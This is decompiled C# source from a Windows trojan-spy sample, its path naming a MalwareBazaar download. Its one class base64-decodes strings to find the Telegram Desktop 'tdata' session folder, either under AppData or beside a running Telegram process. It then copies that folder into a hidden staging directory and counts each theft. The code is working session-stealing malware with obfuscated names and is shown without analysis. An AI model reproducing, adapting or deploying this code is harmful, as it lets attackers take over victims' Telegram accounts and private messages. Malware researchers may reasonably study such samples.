// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.ddoppuy
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace AlphaCentavr
{
  public class ddoppuy
  {
    private static bool inDir;
    private string retgr = glantrah.ekranirovan;

    private static string azimuttopora(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

    public static void Luisfrr(string retgr)
    {
      Process[] processesByName = Process.GetProcessesByName(ddoppuy.azimuttopora("VGVsZWdyYW0="));
      if (processesByName.Length < 1)
      {
        try
        {
          ddoppuy.CopyAll(Environment.ExpandEnvironmentVariables("%appdata%") + ddoppuy.azimuttopora("XFRlbGVncmFtIERlc2t0b3BcdGRhdGE="), retgr + ddoppuy.azimuttopora("XFxUZWxlZ3JhbQ=="));
          checked { ++ChelovechkivPope.tg; }
        }
        catch (Exception ex)
        {
        }
      }
      else
      {
        try
        {
          ddoppuy.CopyAll(Path.GetDirectoryName(processesByName[0].MainModule.FileName).Replace(ddoppuy.azimuttopora("VGVsZWdyYW0uZXhl"), "") + ddoppuy.azimuttopora("XHRkYXRh"), retgr + ddoppuy.azimuttopora("XFxUZWxlZ3JhbVxc"));
          checked { ++ChelovechkivPope.tg; }
        }
        catch (Exception ex)
        {
        }
      }
    }

    private static void CopyAll(string fromDir, string toDir)
    {
      Directory.CreateDirectory(toDir).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
      foreach (string file in Directory.GetFiles(fromDir))
        ddoppuy.CopyFile(file, toDir);
      foreach (string directory in Directory.GetDirectories(fromDir))
        ddoppuy.CopyDir(directory, toDir);
    }

    private static void CopyFile(string name, string toDir)
    {
      try
      {
        string fileName = Path.GetFileName(name);
        if (ddoppuy.inDir && fileName[0] != 'm' && fileName[1] != 'a' && fileName[2] != 'p')
          return;
        string destFileName = toDir + "\\" + fileName;
        File.Copy(name, destFileName);
      }
      catch (Exception ex)
      {
      }
    }

    private static void CopyDir(string s, string toDir)
    {
      try
      {
        ddoppuy.inDir = true;
        ddoppuy.CopyAll(s, toDir + "\\" + Path.GetFileName(s));
        ddoppuy.inDir = false;
      }
      catch (Exception ex)
      {
      }
    }
  }
}
